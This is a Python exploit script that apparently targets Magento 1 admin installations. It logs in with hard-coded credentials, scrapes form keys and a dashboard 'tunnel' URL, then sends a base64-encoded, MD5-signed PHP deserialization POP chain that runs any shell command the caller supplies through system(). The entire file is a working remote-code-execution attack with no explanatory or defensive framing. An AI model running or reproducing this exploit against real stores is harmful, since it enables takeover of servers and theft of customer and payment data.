import requests
import re
import base64
from hashlib import md5
import sys
from bs4 import BeautifulSoup

def usage():
    print("Usage: python {} <target> <argument>\nExample: python {} http://localhost \"uname -a\"".format(sys.argv[0], sys.argv[0]))
    sys.exit()

if len(sys.argv) != 3:
    usage()

# Command-line args
target = sys.argv[1]
arg = sys.argv[2]

# Config.
username = 'forme'
password = 'forme'
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml

# POP chain to pivot into call_user_exec
payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
          '\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
          'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"'     \
          'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00'     \
          '_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
          ';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function,
                                                                                     len(arg), arg)

session = requests.Session()
login_page = session.get(target)

# Parsing the login form
soup = BeautifulSoup(login_page.text, 'html.parser')
login_form = soup.find('form')

if not login_form:
    print("Login form not found.")
    sys.exit()

login_url = login_form.get('action')
if not login_url.startswith('http'):
    login_url = target + login_url

# Attempt to find the form_key from the page
form_key = None
form_key_input = login_form.find('input', {'name': 'form_key'})
if form_key_input:
    form_key = form_key_input.get('value')

if not form_key:
    form_key_match = re.search(r'var FORM_KEY = \'(.*)\'', login_page.text)
    if form_key_match:
        form_key = form_key_match.group(1)

if not form_key:
    print("FORM_KEY not found.")
    sys.exit()

# Perform login
login_data = {
    'login[username]': username,
    'login[password]': password,
    'form_key': form_key
}

response = session.post(login_url, data=login_data)

# Get ajaxBlockUrl and FORM_KEY
ajax_url_match = re.search(r"ajaxBlockUrl = \'(.*)\'", response.text)
if not ajax_url_match:
    print("ajaxBlockUrl not found.")
    sys.exit()

ajax_url = ajax_url_match.group(1)
if not ajax_url.startswith('http'):
    ajax_url = target + ajax_url

form_key_match = re.search(r"var FORM_KEY = '(.*)'", response.text)
if not form_key_match:
    print("FORM_KEY not found in response.")
    sys.exit()

form_key = form_key_match.group(1)

# Send ajax request to get tunnel URL
ajax_data = {
    'isAjax': 'false',
    'form_key': form_key
}

ajax_response = session.post(ajax_url + 'block/tab_orders/period/7d/?isAjax=true', data=ajax_data)
tunnel_match = re.search(r'src="(.*)\?ga=', ajax_response.text)
if not tunnel_match:
    print("Tunnel URL not found.")
    sys.exit()

tunnel = tunnel_match.group(1)

payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
gh = md5((payload + install_date).encode('utf-8')).hexdigest()

exploit_url = tunnel + '?ga=' + payload + '&h=' + gh

try:
    exploit_response = session.get(exploit_url)
    print(exploit_response.text)
except requests.exceptions.RequestException as e:
    print(e)
